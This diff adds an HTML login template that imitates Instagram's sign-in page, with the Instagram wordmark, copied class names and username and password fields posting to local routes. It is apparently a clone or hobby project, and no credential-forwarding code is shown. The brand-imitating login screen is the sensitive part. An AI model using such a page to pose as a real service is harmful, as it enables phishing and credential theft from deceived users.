@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>login</title>
+    <link rel="stylesheet" href="/static/css/login.css" type="text/css" />
+</head>
+<body>
+  <main class="_8fi2q _2v79o" role="main">
+                <article class="_qmq8y">
+                <div class="_ngtox _sf3lp"><div class="_a8pmp">
+                    <img class="_824m9 _4je3h" src="/static/image/1.jpg">
+                </div></div>
+               <div class="_f9sjj _kbq82">
+                <h1 class="_68swa _8scx2 coreSpriteLoggedOutWordmark">Instagram</h1>
+                <div class="_7g6uj">
+                    <form class="_asaim" id="loginform">
+                         {% if (msg | length) > 0 %}
+                        <h4 class="_mb54c">{{ msg }}</h4>
+                         {% else %}
+                        <h4 class="_mb54c">Sign up to see photos and videos from your friends.</h4>
+                         {% endif %}
+                        <div class="_fhskl">
+                            <div class="_j5suk"></div>
+                            <div class="_hxmdu"></div>
+                            <div class="_j5suk"></div>
+                        </div>
+                            <div class="_agqzm">
+                                    <div class="_sjplo">
+                                        <input class="_ph6vk _o716c" aria-describedby="" aria-label="Username" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="30" name="username" placeholder="Username" value="" type="text">
+                                        <div class="_gaby6"></div>
+                                    </div>
+                                </div>
+                                    <div class="_agqzm">
+                                        <div class="_sjplo">
+                                            <input class="_ph6vk _o716c" aria-describedby="" aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" placeholder="Password" value="" type="password">
+                                            <div class="_gaby6"></div></div></div>
+                                            <div><span class="_9mno0 _ov9ai">
+                                                <button class="_qv64e _gexxb _4tgw8 _njrw0" onclick="form=document.getElementById('loginform');form.action='/reg/';">Sign up</button>
+                                                <button class="_qv64e _gexxb _4tgw8 _njrw0" onclick="form=document.getElementById('loginform');form.action='/relogin/';">login in</button></span></div>
+                                                <p class="_fd2m9"></p>
+                         </form>
+                                        </div></div>
+                                    </div>
+
+
+                                    </article>
+                                </main>
+</body>
+<script  src="/static/js/jquery-3.3.1.min.js"></script>
+</html>
